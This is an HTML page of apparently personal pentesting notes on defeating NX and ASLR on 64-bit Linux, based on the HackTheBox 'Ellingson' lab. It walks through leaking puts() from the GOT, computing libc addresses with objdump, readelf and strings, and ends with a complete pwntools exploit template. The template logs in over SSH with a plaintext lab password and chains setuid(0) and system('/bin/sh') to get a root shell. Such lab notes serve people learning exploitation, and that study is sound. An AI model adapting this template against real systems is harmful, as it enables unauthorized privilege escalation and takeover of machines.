<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>NX + ASLR</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Linux - x64 - Bypass Protections - NX + ASLR</h1></strong><br />• NX can be bypassed with ret2libc<br />• ASLR is too much to bruteforce on 64-bit machines. <br />   ◇ Instead, we leak the address of a function from the GOT (Global Offset Table)<br />   ◇ You then subtract the function&#39;s offset from the function&#39;s address in the GOT<br />      ▪ this will give you the base address of LIBC<br />   ◇ You then use the LIBC base address to calculate the address of the functions you need, like system(), and perform a ret2libc attack using the calculated addresses<br />   ◇ For info on the PLT and GOT, refer to <a href="Linux--About_Linux_Binaries--Linking--Relocations_-_PLT_and_GOT.html">Relocations - PLT and GOT</a><br />   ◇ For a better explanation of the whole exploit, refer to <em><code>hackthebox Ellingson</code></em> write-up<br /><br />Stage 1 = use GOT to leak function address, use it to calculate LIBC base address<br />Stage 2 = perform ret2libc<br /><br /><strong>Examples</strong><br />• hackthebox Ellingson<br /><br /><strong><h2>## You will need</h2></strong><br />• Offset to RIP<br />• A <code>pop rdi; ret</code> gadget - so that we can pop function parameters into RDI<br />• puts() addresses<br />   ◇ puts() PLT address - to run puts() function<br />   ◇ puts() GOT address - the parameter to be used with puts() which points to puts()&#39;s GOT entry to leak puts() GOT address<br />• main() PLT address - used to return to main() and put the program back into a function state ready for stage 2 payload<br />• libc offsets<br />   ◇ libc puts() offset - used to calculate libc&#39;s base address<br />   ◇ libc setuid() offset - used to calculate libc setuid() address<br />   ◇ libc system() offset - used to calculate libc system() address<br />   ◇ offset to a &quot;/bin/sh&quot; string - used with system() to spawn a shell<br /><br /><strong><h3>### Find puts() PLT and GOT address</h3></strong><br />This needs to be done on the target system.<br />Use objdump.<br /><div class="codebox"><div class="codebox">margo@ellingson:~$&nbsp;objdump&nbsp;-D&nbsp;/usr/bin/garbage&nbsp;|&nbsp;grep&nbsp;puts<br />0000000000401050&nbsp;&lt;puts@plt&gt;:<br />&nbsp;&nbsp;401050:&nbsp;ff&nbsp;25&nbsp;d2&nbsp;2f&nbsp;00&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmpq&nbsp;&nbsp;&nbsp;*0x2fd2(%rip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;404028&nbsp;&lt;puts@GLIBC_2.2.5&gt;</div></div><br /><br /><code>401050</code> is puts()&#39;s PLT address.<br /><code>404028</code> is puts()&#39;s GOT address.<br /><br /><strong><h3>### Find main() PLT address</h3></strong><br />This is also done on the target system with objdump.<br /><div class="codebox"><div class="codebox">margo@ellingson:~$&nbsp;objdump&nbsp;-D&nbsp;/usr/bin/garbage&nbsp;|&nbsp;grep&nbsp;main<br />&nbsp;&nbsp;401194:&nbsp;ff&nbsp;15&nbsp;56&nbsp;2e&nbsp;00&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;callq&nbsp;&nbsp;*0x2e56(%rip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;403ff0&nbsp;&lt;__libc_start_main@GLIBC_2.2.5&gt;<br />0000000000401619&nbsp;&lt;main&gt;:<br />&nbsp;&nbsp;401644:&nbsp;0f&nbsp;84&nbsp;e6&nbsp;00&nbsp;00&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;401730&nbsp;&lt;main+0x117&gt;<br />&nbsp;&nbsp;4016cd:&nbsp;74&nbsp;24&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4016f3&nbsp;&lt;main+0xda&gt;</div></div><br /><br /><code>0000000000401619</code> is the address of <code>main()</code> in the PLT.<br />You can get rid of the preceding 0s - <code>0x401619</code>.<br /><br /><strong><h3>### Find function offsets in libc</h3></strong><br />Again, this needs to be done on the target system.<br />The 3 function offsets we need are puts(), setuid(), system().<br />You can get rid of the preceding 0s from all of these offsets.<br /><br /><strong>puts() offset</strong><br /><div class="codebox"><div class="codebox">margo@ellingson:~$&nbsp;readelf&nbsp;-s&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;puts<br />&nbsp;&nbsp;&nbsp;191:&nbsp;00000000000809c0&nbsp;&nbsp;&nbsp;512&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;GLOBAL&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;_IO_puts@@GLIBC_2.2.5<br />&nbsp;&nbsp;&nbsp;422:&nbsp;00000000000809c0&nbsp;&nbsp;&nbsp;512&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;puts@@GLIBC_2.2<br />&nbsp;&nbsp;&nbsp;...&nbsp;</div></div><br /><code>0x0809c0</code> is the offset to puts()<br /><br /><strong>setuid() offset</strong><br /><div class="codebox"><div class="codebox">margo@ellingson:~$&nbsp;readelf&nbsp;-s&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;setuid<br />&nbsp;&nbsp;&nbsp;&nbsp;23:&nbsp;00000000000e5970&nbsp;&nbsp;&nbsp;144&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;setuid@@GLIBC_2.2.5</div></div><br /><code>0x0e5970</code> is the offset to setuid()<br /><br /><strong>system() offset</strong> <br /><div class="codebox"><div class="codebox">margo@ellingson:~$&nbsp;readelf&nbsp;-s&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;system<br />&nbsp;&nbsp;&nbsp;232:&nbsp;0000000000159e20&nbsp;&nbsp;&nbsp;&nbsp;99&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;GLOBAL&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;svcerr_systemerr@@GLIBC_2.2.5<br />&nbsp;&nbsp;&nbsp;607:&nbsp;000000000004f440&nbsp;&nbsp;&nbsp;&nbsp;45&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;GLOBAL&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;__libc_system@@GLIBC_PRIVATE<br />&nbsp;&nbsp;1403:&nbsp;000000000004f440&nbsp;&nbsp;&nbsp;&nbsp;45&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;system@@GLIBC_2.2.5</div></div><br /><br /><code>0x04f440</code> is the offset to <code>system()</code><br /><br /><strong><h3>### Find offset to a &quot;/bin/sh&quot; string</h3></strong><br />Again, this needs to be done on the target system.<br /><div class="codebox"><div class="codebox">margo@ellingson:~$&nbsp;strings&nbsp;-a&nbsp;-t&nbsp;x&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;/bin/sh<br />&nbsp;1b3e9a&nbsp;/bin/sh</div></div><br /><code>0x1b3e9a</code> is an offset to a <code>/bin/sh</code> string in libc.<br /><br /><strong><h2>## Template</h2></strong><br /><div class="codebox"><div class="codebox">#!/usr/bin/env&nbsp;python<br /><br />import&nbsp;struct<br />from&nbsp;pwn&nbsp;import&nbsp;*<br /><br />context(os=&quot;linux&quot;,&nbsp;arch=&quot;amd64&quot;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;set&nbsp;target&nbsp;system&nbsp;architecture<br />#context.log_level&nbsp;=&nbsp;&#39;DEBUG&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;enable&nbsp;if&nbsp;you&nbsp;want&nbsp;debug/verbose&nbsp;output<br />s&nbsp;=&nbsp;ssh(host&nbsp;=&nbsp;&#39;10.10.10.139&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;remote&nbsp;connection&nbsp;info<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user&nbsp;=&nbsp;&#39;margo&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;=&nbsp;&#39;iamgod$08&#39;)<br /><br /><br />#&nbsp;PAYLOAD<br />#&nbsp;-----------------------------------------------------------<br />#&nbsp;Stage&nbsp;1&nbsp;-&nbsp;1a)&nbsp;Leak&nbsp;address&nbsp;of&nbsp;puts()&nbsp;in&nbsp;Gloabl&nbsp;Offset&nbsp;Table<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1b)&nbsp;return&nbsp;to&nbsp;main&nbsp;(to&nbsp;put&nbsp;program&nbsp;back&nbsp;into&nbsp;a&nbsp;functioning&nbsp;state)<br /><br />offset_to_rip&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;0<br /><br />#&nbsp;addresses<br />puts_plt_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;Q&#39;,&nbsp;0x401050)&nbsp;&nbsp;&nbsp;#&nbsp;objdump&nbsp;-D&nbsp;binary&nbsp;|&nbsp;grep&nbsp;puts<br />puts_got_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;Q&#39;,&nbsp;0x404028)&nbsp;&nbsp;&nbsp;#&nbsp;objdump&nbsp;-D&nbsp;binary&nbsp;|&nbsp;grep&nbsp;puts<br />main_plt_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;Q&#39;,&nbsp;0x401619)&nbsp;&nbsp;&nbsp;#&nbsp;objdump&nbsp;-D&nbsp;binary&nbsp;|&nbsp;grep&nbsp;main<br /><br />#&nbsp;ROP&nbsp;gadgets<br />pop_rdi_addr&nbsp;&nbsp;=&nbsp;struct.pack(&#39;&lt;Q&#39;,&nbsp;0x0040179b)&nbsp;&nbsp;&nbsp;<br /><br />#&nbsp;Stage&nbsp;1a&nbsp;-&nbsp;leak&nbsp;address&nbsp;of&nbsp;puts()&nbsp;by&nbsp;reading&nbsp;from&nbsp;GOT<br />payload&nbsp;&nbsp;=&nbsp;offset_to_rip<br />payload&nbsp;+=&nbsp;pop_rdi_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;puts()&nbsp;GOT&nbsp;address&nbsp;parameter&nbsp;into&nbsp;RDI<br />payload&nbsp;+=&nbsp;puts_got_addr<br />payload&nbsp;+=&nbsp;puts_plt_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;run&nbsp;puts(puts_got_addr)&nbsp;to&nbsp;read&nbsp;value&nbsp;@&nbsp;puts_got_addr&nbsp;in&nbsp;GOT&nbsp;and&nbsp;leak&nbsp;address<br /><br />#&nbsp;Stage&nbsp;1b&nbsp;-&nbsp;return&nbsp;to&nbsp;main<br />payload&nbsp;+=&nbsp;main_plt_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;set&nbsp;up&nbsp;for&nbsp;stage&nbsp;2&nbsp;-&nbsp;return&nbsp;to&nbsp;main&nbsp;to&nbsp;put&nbsp;exploit&nbsp;back&nbsp;into&nbsp;working&nbsp;state<br /><br />#&nbsp;Stage&nbsp;1c&nbsp;-&nbsp;send&nbsp;payload&nbsp;and&nbsp;calculate&nbsp;leaked&nbsp;puts()&nbsp;address<br />p&nbsp;=&nbsp;s.process(&#39;/usr/bin/garbage&#39;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;start&nbsp;process&nbsp;with&nbsp;pwntools<br />p.sendline(payload)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;send&nbsp;payload<br />p.recvuntil(&quot;denied.&quot;)<br />#&nbsp;SYNTAX&nbsp;OF&nbsp;NEXT&nbsp;LINE&nbsp;IS&nbsp;ABSOLUTELY&nbsp;CRUCIAL.&nbsp;ADDRESS&nbsp;IS&nbsp;TOTALLY&nbsp;DIFFERENT&nbsp;IF&nbsp;THIS&nbsp;LINE&nbsp;IS&nbsp;ALTERED<br />leaked_puts&nbsp;=&nbsp;p.recv()[:8].strip().ljust(8,&nbsp;&quot;\x00&quot;)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;receive&nbsp;leaked&nbsp;puts&nbsp;address&nbsp;from&nbsp;GOT<br /><br />upack_leaked_puts&nbsp;=&nbsp;u64(leaked_puts)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;unpack&nbsp;leaked&nbsp;puts&nbsp;into&nbsp;address<br />print&nbsp;&quot;Leaked&nbsp;puts@GLIBC:&nbsp;&quot;&nbsp;+&nbsp;hex(upack_leaked_puts)<br /><br />#&nbsp;-----------------------------------------------------------<br />#&nbsp;Stage&nbsp;2&nbsp;-&nbsp;Calculate&nbsp;libc&nbsp;setuid()&nbsp;and&nbsp;libc&nbsp;system()&nbsp;address&nbsp;using&nbsp;leaked&nbsp;puts&nbsp;address<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2a)&nbsp;run&nbsp;setuid(0)<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2b)&nbsp;run&nbsp;system(&quot;/bin/sh&quot;)&nbsp;to&nbsp;spawn&nbsp;a&nbsp;shell!<br /><br />libc_puts_offset&nbsp;=&nbsp;0x0809c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;readelf&nbsp;-s&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;puts<br />libc_setuid_offset&nbsp;=&nbsp;0x0e5970&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;readelf&nbsp;-s&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;setuid<br />libc_system_offset&nbsp;=&nbsp;0x04f440&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;readelf&nbsp;-s&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;system<br />libc_binsh_offset&nbsp;=&nbsp;0x1b3e9a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;strings&nbsp;-a&nbsp;-t&nbsp;x&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;/bin/sh<br /><br />null&nbsp;=&nbsp;struct.pack(&#39;&lt;Q&#39;,&nbsp;0x0)<br /><br />libc_base_addr&nbsp;=&nbsp;upack_leaked_puts&nbsp;-&nbsp;libc_puts_offset<br />libc_setuid_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;Q&#39;,&nbsp;libc_base_addr&nbsp;+&nbsp;libc_setuid_offset)<br />libc_system_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;Q&#39;,&nbsp;libc_base_addr&nbsp;+&nbsp;libc_system_offset)<br />libc_binsh_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;Q&#39;,&nbsp;libc_base_addr&nbsp;+&nbsp;libc_binsh_offset)<br /><br />print&nbsp;&quot;Calculated&nbsp;addresses:&quot;<br />print&nbsp;&quot;1&nbsp;-&nbsp;libc&nbsp;base&nbsp;address:&nbsp;&quot;&nbsp;+&nbsp;hex(libc_base_addr)<br />print&nbsp;&quot;2&nbsp;-&nbsp;libc&nbsp;setuid&nbsp;address:&nbsp;&quot;&nbsp;+&nbsp;hex(u64(libc_setuid_addr))<br />print&nbsp;&quot;3&nbsp;-&nbsp;libc&nbsp;system&nbsp;address:&nbsp;&quot;&nbsp;+&nbsp;hex(u64(libc_system_addr))<br />print&nbsp;&quot;4&nbsp;-&nbsp;libc&nbsp;/bin/sh&nbsp;address:&nbsp;&quot;&nbsp;+&nbsp;hex(u64(libc_binsh_addr))<br /><br />payload&nbsp;&nbsp;=&nbsp;offset_to_rip<br />#Stage&nbsp;2a&nbsp;-&nbsp;run&nbsp;setuid(0)<br />payload&nbsp;+=&nbsp;pop_rdi_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;overwrite&nbsp;RIP<br />payload&nbsp;+=&nbsp;null&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;0&nbsp;parmaeter&nbsp;into&nbsp;RDI<br />payload&nbsp;+=&nbsp;libc_setuid_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;run&nbsp;setuid(0)<br /><br />#Stage&nbsp;2b&nbsp;-&nbsp;run&nbsp;system(&quot;/bin/sh&quot;)<br />payload&nbsp;+=&nbsp;pop_rdi_addr<br />payload&nbsp;+=&nbsp;libc_binsh_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;libc&nbsp;&quot;/bin/sh&quot;&nbsp;string&nbsp;into&nbsp;RDI<br />payload&nbsp;+=&nbsp;libc_system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;run&nbsp;libc&nbsp;system(&quot;/bin/sh&quot;)<br /><br />#&nbsp;EXPLOIT<br />#&nbsp;-----------------------------------------------------------<br />p.sendline(payload)<br />p.interactive()</div></div><br /><br /></div>
</body>
</html>
